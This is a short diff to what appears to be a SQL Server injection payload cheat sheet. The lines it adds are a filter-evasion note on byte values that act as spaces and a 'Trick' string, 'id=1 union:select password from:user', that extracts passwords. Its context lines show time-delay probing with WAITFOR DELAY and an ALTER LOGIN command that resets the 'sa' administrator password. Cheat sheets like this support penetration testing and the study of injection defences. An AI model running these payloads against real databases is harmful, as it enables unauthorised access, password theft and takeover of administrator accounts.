@@ -6,6 +6,8 @@ SQL Server Payload
 - Comment 
     - ``SELECT 1 -- comment``
     - ``SELECT /*comment*/1``
+- Space
+    - ``0x01 - 0x20``
 - Current User
     - ``SELECT user_name()``
     - ``SELECT system_user``
@@ -27,3 +29,5 @@ SQL Server Payload
     - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
 - Change Password
     - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
+- Trick
+    - ``id=1 union:select password from:user``
